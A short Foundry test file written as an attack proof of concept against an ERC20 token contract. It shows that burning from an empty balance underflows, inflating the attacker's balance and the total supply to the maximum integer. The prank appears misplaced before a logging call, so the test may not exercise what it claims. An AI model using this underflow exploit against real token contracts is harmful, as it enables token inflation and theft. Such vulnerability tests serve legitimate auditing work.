// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/src/Test.sol";
import "else/ERC20Token0x.sol";

contract AttackPOC is Test {

    ERC20Token0x public token;
    address public sender;

    function setUp() public {
        token = new ERC20Token0x(0);
        sender = address(1);
    }

    function test_UnderflowInflatesTotalSupplyAndAttackerBalance() public {
        vm.prank(sender);
        console.log("Attacker balance before:", token._balanceOf(sender));
        token.burn(1);
        // it will make the total supply and the attacker equal to uint.max
        console.log("Attacker balance after:", token._balanceOf(sender));
        assertEq(token._balanceOf(sender),type(uint256).max);
        assertEq(token.totalSupply(sender),type(uint256).max);
    }
}